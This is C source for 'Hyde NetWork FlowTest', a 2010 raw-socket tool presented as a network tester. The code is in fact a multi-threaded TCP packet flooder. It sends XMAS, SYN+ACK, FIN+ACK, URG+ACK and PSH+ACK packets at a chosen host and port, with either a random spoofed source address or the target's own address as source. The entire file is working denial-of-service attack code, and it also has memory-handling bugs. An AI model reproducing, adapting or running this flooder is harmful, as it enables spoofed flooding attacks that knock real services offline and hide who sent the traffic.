/*
        ..::Hyde:NetWork:FlowTest::..
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░▓██████▒░▓████░▓████░▓█▒░░░░▓█████▒░▓██████▒░░░░
░░▓██▒░░░░░░▓▒░░█░▓▒░░█░▓█▒░░░░▓█▒░░░░░▓█▒░░░█▒░░░░
░░▓█▒░░░░░░░▓▒░░█░▓▒░░█░▓█▒░░░░▓████▒░░▓█████▒░░░░░
░░▓██▒░░░░░░▓▒░░█░▓▒░░█░▓█▒░░░░▓█▒░░░░░▓█▒░░▓█▒░░░░
░░░▓██████▒░▓████░▓████░▓████▒░▓█████▒░▓█▒░░░▓█▒░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                   "He nozes"

 *  jUsT Another Tool to Test your NetWork
  "follow this:",
  "./code HOST PORT Number_Packets_to_send TYPE threads",
  " 0 - XMAS with Spoofing",
  " 1 - SYN+ACK with Spoofing",
  " 2 - SYN+ACK with Mirror Spoofing",
  " 3 - FIN+ACK with Spoofing",
  " 4 - FIN+ACK with Mirror Spoofing",
  " 5 - URG+ACK with Spoofing",
  " 6 - URG+ACK With Mirror Spoofing",
  " 7 - PSH+ACK With Spoofing",
  " 8 - XMAS with Mirror Spoofing",
  "ex: ./code www.server.com 80 20000 4 5",
  "..::Hyde:NetWork:FlowTest::..",

 Need RooT to COmpile THis
  gcc -o hyde2 hyde2.c -lpthread;

Author: Cooler_
E-mail: c00f3r[at]gmail[dot]com
date: 17/03/2010
BugSec Security TEAM
http://code.google.com/p/bugsec/
thanks: m0nad,_mlk_,IAK,sigsegv,b-man,delfo,c0lt7r,joey,fokerbug,zepplin,otacon,backbone,nibbles,voidpointer,muzgo...
 
*/
#include <stdio.h>    
#include <stdlib.h> 
#include <string.h>    
#include <unistd.h>    
#include <sys/time.h>    
// socks
#include <netdb.h>      
#include <sys/socket.h>    
#include <arpa/inet.h>    
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>  
     
#define SIZE 50
#define BUF 19

// pthread Header
#include <pthread.h>


//Mutex Always is global, because the functions need look him to call
pthread_mutex_t morfo = PTHREAD_MUTEX_INITIALIZER;

char *RandomIp(void)
{     
 char *ipRand=NULL;
 int r1,r2,r3,r4;

 r1 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));          
 r2 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));          
 r3 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));          
 r4 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));          

 ipRand=malloc(12*sizeof(char *));
 sprintf(ipRand,"%d.%d.%d.%d",r1,r2,r3,r4); 

 return ipRand; 
}
     
//calculo feito afim de checar a integridade 
unsigned short in_cksum(unsigned short *ptr, int nbytes) 
{    
 register u_short    answer;     // u_short == 16 bits   
 register long       sum;        // long == 32 bits    
 u_short         oddbyte;     
     
 sum = 0;    
 while(nbytes > 1)  
 {    
  sum += *ptr++;   
  nbytes -= 2;    
 }    
                        
 if(!(nbytes^1)) 
 {    
  oddbyte = 0;       
  *((u_char *) &oddbyte) = *(u_char *)ptr;      
  sum += oddbyte;    
 }    
     
 sum = (sum >> 16) + (sum & 0xffff);  // addicina auto-16 para baixo-16     
 sum += (sum >> 16);           
 answer = ~sum;         
 return(answer);    
}    
     


//function from my Brother I4K the master of wizards
//from Orion-Socket API
int orion_getHostByName(const char* name, char* buffer)
{
    struct addrinfo hints, * res, * res0 = NULL;
    struct sockaddr_in * target = NULL;
    int error;
    char *tmp = NULL;
    
    memset(&hints, 0, sizeof(struct addrinfo));
    
    hints.ai_family = PF_UNSPEC;
    hints.ai_socktype = 0;
    error = getaddrinfo(name, "http", &hints, &res0);
    
    if(error)
    {
        if (res0)
            freeaddrinfo(res0);
        return 1;
    }
    
    for (res = res0; res; res = res->ai_next)
    {
        target = (struct sockaddr_in *) res->ai_addr;
        if (target)
        {
            tmp = inet_ntoa(target->sin_addr);
            if (tmp && strlen(tmp))
            {
                strncpy(buffer, tmp, strlen(tmp));
                buffer[strlen(tmp)] = '\0';
                if (res0)
                    freeaddrinfo(res0);
                return 1;
            }
        }
    }
    
    freeaddrinfo(res0);
    
    return 0;
}

void *fazerpacote(void *arg)
{
 char *source_addr,*dest_addr; 
 unsigned short dest_port,ran_port; 
 int escolha;

// Unpack args
 char **arguments = (char **)arg;
 source_addr=arguments[0];
 dest_addr=arguments[1];
 dest_port=atoi(arguments[2]);
 ran_port=atoi(arguments[3]);
 escolha=atoi(arguments[4]);
/////

 struct envio {    
  struct iphdr ip;    
  struct tcphdr tcp;    
 } envio;    

 struct pseudo_header {    
  unsigned int source_address;    
  unsigned int dest_address;    
  unsigned char placeholder;    
  unsigned char protocol;    
  unsigned short tcp_length;    
  struct tcphdr tcp;    
 } pseudo_header;
    
 int tcp_socket;   
 int sinlen;  
 struct sockaddr_in sin; 
 unsigned int remetente,destino;

 pthread_mutex_lock(&morfo);

// string 2 int
// if ipv6 AF_INET6
 inet_pton(AF_INET, source_addr, &remetente);
 inet_pton(AF_INET, dest_addr, &destino);
         
//setamos variaveis do pacote ip   
 envio.ip.ihl = 5;    
 envio.ip.version = 4;    
 envio.ip.tos = 0;    
 envio.ip.tot_len = htons(40);    
 envio.ip.id = ran_port;    
 envio.ip.frag_off = 0;    
 envio.ip.ttl = 255;    
 envio.ip.protocol = IPPROTO_TCP;    
 envio.ip.check = 0;    
 envio.ip.saddr = remetente;    
 envio.ip.daddr = destino;    
        
//setamos variaveis do pacote TCP    
 envio.tcp.source = ran_port;    
 envio.tcp.dest = htons(dest_port);    
 envio.tcp.seq = ran_port;          
 envio.tcp.res1 = 0;
 envio.tcp.res2 = 0;     
 envio.tcp.doff = 5;    
 envio.tcp.ack = 0; 
 envio.tcp.ack_seq = 0;    
 envio.tcp.urg_ptr = 0;        
 envio.tcp.window = htons(512);    
 envio.tcp.check = 0;    
  switch(escolha)
  {
// XMAS with Spoofing
    case 0:
     envio.tcp.fin = 1;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 1;    
     envio.tcp.psh = 1;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;

// SYN with Spoofing
    case 1:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// SYN with Mirror Spoofing
    case 2:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// FIN with spoofing
    case 3:
     envio.tcp.fin = 1;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

//FIN with Mirror Spoofing
    case 4:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// URG ...
    case 5:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;

    case 6:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;
// PSH ...
    case 7:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 1;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// XMAS with mirror
    case 8:
     envio.tcp.fin = 1;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 1;    
     envio.tcp.psh = 1;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;
  }
            
  sin.sin_family = AF_INET;    
  sin.sin_port = envio.tcp.source;    
  sin.sin_addr.s_addr = envio.ip.daddr;       
        
// abrimos a socket   
  tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);    
  if(tcp_socket < 0) 
  {    
   perror("socket");    
   exit(1);    
  }    
        
// setamos os campos que precisão ser mudados   
  envio.tcp.source++;    
  envio.ip.id++;    
  envio.tcp.seq++;    
  envio.tcp.check = 0;    
  envio.ip.check = 0;    
           
// checksum   
  envio.ip.check = in_cksum((unsigned short *)&envio.ip, 20); //20    
     
// setamos campo dos cabeçalhos  
  pseudo_header.source_address = envio.ip.saddr;    
  pseudo_header.dest_address = envio.ip.daddr;    
  pseudo_header.placeholder = 0;    
  pseudo_header.protocol = IPPROTO_TCP;    
  pseudo_header.tcp_length = htons(20);    

  bcopy((char *)&envio.tcp, (char *)&pseudo_header.tcp, 20); //20  
  envio.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32); //32    
  sinlen = sizeof(sin);   

  sendto(tcp_socket, &envio, 40, 0, (struct sockaddr *)&sin, sinlen);  
  close(tcp_socket);   
 
 pthread_mutex_unlock(&morfo);
 pthread_exit(NULL);
}    
   
void help()
{
 int c=12;
 char *banner[] = {
  "follow this:",
  "./code HOST PORT Number_Packets TYPE Threads",
  " 0 - XMAS with Spoofing",
  " 1 - SYN+ACK with Spoofing",
  " 2 - SYN+ACK with Mirror Spoofing",
  " 3 - FIN+ACK with Spoofing",
  " 4 - FIN+ACK with Mirror Spoofing",
  " 5 - URG+ACK with Spoofing",
  " 6 - URG+ACK With Mirror Spoofing",
  " 7 - PSH+ACK With Spoofing",
  " 8 - XMAS with Mirror Spoofing",
  "ex: ./code www.server.com 80 20000 4 50",
  "..::Hyde:NetWork:FlowTest::.. ",
 };

 while(c^0)
  puts(banner[c]),c--;
}


int main(int argc, char *argv[]) 
{
 char IP[15];
 char *remetente=NULL,*destino=NULL;

 unsigned short port=80;     
 int escolha=0,filhos=0,count=0,number=500,max=0;
 int8_t rc1;
    
 if(argc < 6) 
 {
  help();    
  exit(0);    
 }    

 if(!orion_getHostByName(argv[1],IP))
 {
  puts("orion_gethostbyname() failed");
  exit(1);
 }

  printf("\nIP: %s \n",IP);
     
  if(argc >= 3) 
   port = atoi(argv[2]);    
  if(argc >= 4) 
   number = atoi(argv[3]);
  if(argc >= 5) 
   escolha = atoi(argv[4]);       
  if(argc >= 6) 
   filhos = atoi(argv[5]);         
  if(filhos<2) 
   filhos = 2;   
 
    
  fprintf(stdout,"fate  : %s\n",argv[1]);    
  fprintf(stdout,"Port         : %u\n",port);    
  fprintf(stdout,"threads         : %u\n",filhos);
  fprintf(stdout,"Number of times: %d\n\n", number); 
     
  destino=malloc(sizeof(IP));  
  strncpy(destino,IP, (sizeof(IP)) );

  switch(escolha)
  {
    case 0: 
     puts("Type: XMAS with Spoofing");
     break;

    case 1:
     puts("Type: SYN+ACK with Spoofing");   
     break;

    case 2: 
     puts("Type: SYN+ACK with Mirror Spoofing");
     break;
 
    case 3: 
     puts("Type: FIN+ACK with Spoofing");
     break;

    case 4: 
     puts("Type: FIN+ACK with Mirror Spoofing");
     break;

    case 5: 
     puts("Type: URG+ACK with Spoofing");
     break;

    case 6: 
     puts("Type: URG+ACK with Mirror Spoofing");
     break;

    case 7: 
     puts("Type: PSH+ACK with Spoofing");
     break;

    case 8: 
     puts("Type: XMAS with Mirror Spoofing");
     break;
  }  

 //thread plan
   pthread_t *thread;
   thread=(pthread_t *)malloc(sizeof(pthread_t)*filhos+1);
   char **ThreadArgv;

   ThreadArgv=(char **)malloc(4*sizeof(char *));
   char *StrPort=(char *)malloc(sizeof(char)*6);
   sprintf( StrPort,"%d",  port);
   ThreadArgv[2]=StrPort;
   ThreadArgv[3]=StrPort;
   char *StrChoice=(char *)malloc(sizeof(char)*3);
   sprintf( StrChoice,"%d", escolha);
   ThreadArgv[4]=StrChoice;
   remetente=RandomIp();
 
 while(number^0) 
 {  
  count=filhos;

    if( (!(escolha&1))&&(escolha^0) )
    {
// packing arguments 2 function
     ThreadArgv[0]=destino;
     ThreadArgv[1]=destino;
     fprintf(stdout,"Hyde look %s the port %u, spoofing %s in port %u\n", IP, port, IP, port);
// start thread
     while(count)
     {
      if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
       puts("error in thread 1");
      count--;
     }
    count=filhos;
// join and re-alloc to join new pthreads
     while(count)
     {
      pthread_join(thread[count],NULL);
      count--;
     }

    }
    else
    { 
// packing arguments 2 function
     ThreadArgv[0]=remetente;
     ThreadArgv[1]=destino;
     fprintf(stdout,"Hyde look %s in port %u, spoofing %s in port %u\n", destino, port, remetente, port);   
// start thread
     while(count)
     {
      if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
       puts("error in thread 1");
      count--;
     }
    count=filhos;
// join and re-alloc to join new pthreads
     while(count)
     {
      pthread_join(thread[count],NULL);
      count--;
     }

    }
   number--;    
  }
  // free heap \o/
 free(thread);
 free(destino);
 free(ThreadArgv);
 free(StrPort);
 free(StrChoice);
  
 return 0;
}    

